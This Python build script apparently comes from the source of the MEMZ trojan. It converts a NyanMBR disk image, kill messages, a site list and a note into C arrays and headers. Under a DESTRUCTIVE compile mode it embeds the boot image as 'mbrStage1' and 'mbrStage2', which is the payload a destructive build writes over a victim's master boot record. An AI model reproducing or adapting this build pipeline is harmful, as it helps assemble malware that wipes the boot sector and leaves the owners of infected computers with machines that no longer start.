import sys
import json

MBRCODE  = "../NyanMBR/disk.img"

NOTE     = "Data/Note.txt"
KILLMSGS = "Data/KillMessages.txt"
SITES    = "Data/Sites.txt"

MODE_BOTH = 0
MODE_DESTRUCTIVE = 1
MODE_CLEAN = 2

def escape_c_string(s):
    # Convierte caracteres especiales a formato de cadena de C segura
    escaped = json.dumps(s)[1:-1]
    return '"' + escaped + '"'

with open(sys.argv[1], "w", encoding="utf-8-sig") as cf:
    with open(sys.argv[2], "w", encoding="utf-8-sig") as hf:
        def writeMode(mode, start):
            if start:
                if mode == MODE_DESTRUCTIVE:
                    cf.write("#ifndef CLEAN\n")
                    hf.write("#ifndef CLEAN\n")
                elif mode == MODE_CLEAN:
                    cf.write("#ifdef CLEAN\n")
                    hf.write("#ifdef CLEAN\n")
            else:
                if mode != MODE_BOTH:
                    cf.write("#endif\n")
                    hf.write("#endif\n")
        
        def writeArray(name, mode, data, func, type, length):
            writeMode(mode, True)

            cf.write(f"const {type} {name}[] = {{\n")
            cf.write(",\n".join([func(x) for x in data]))
            cf.write("\n};\n")
            hf.write(f"extern const {type} {name}[];\n")
            hf.write(f"#define {name}Len {length}\n")
            
            writeMode(mode, False)
        
        def writeStringArray(name, mode, data):
            writeArray(name, mode, data, escape_c_string, "char *", len(data))
        
        def writeStringArrayFromFile(fname, name, mode):
            with open(fname, "r", encoding="utf-8-sig") as inf:
                lines = [line.strip() for line in inf.readlines() if line.strip()]
                writeStringArray(name, mode, lines)
        
        def writeBinaryArray(name, mode, data):
            writeArray(name, mode, data, lambda x: str(x), "unsigned char", len(data))
        
        def writeString(name, mode, data):
            writeMode(mode, True)
            
            escaped = escape_c_string(data.replace("\r\n", "\n").replace("\n", "\r\n"))
            cf.write(f"const char *{name} = {escaped};\n")
            hf.write(f"extern const char *{name};\n")
            hf.write(f"#define {name}Len {len(data)}\n")

            writeMode(mode, False)
        
        def writeStringFromFile(fname, name, mode):
            with open(fname, "r", encoding="utf-8-sig") as inf:
                content = inf.read()
                writeString(name, mode, content)
        
        cf.write('#include "Data.h"\n')
        hf.write("#pragma once\n")
        hf.write('#include "../Source/MEMZ.h"\n')
        
        # MBR Binary
        with open(MBRCODE, "rb") as inf:
            data = inf.read()
            writeBinaryArray("mbrStage1", MODE_DESTRUCTIVE, list(data[:510]))
            writeBinaryArray("mbrStage2", MODE_DESTRUCTIVE, list(data[510:]))

        writeStringArrayFromFile(KILLMSGS, "KillMessages", MODE_DESTRUCTIVE)
        writeStringArrayFromFile(SITES, "Sites", MODE_BOTH)
        writeStringFromFile(NOTE, "Note", MODE_DESTRUCTIVE)
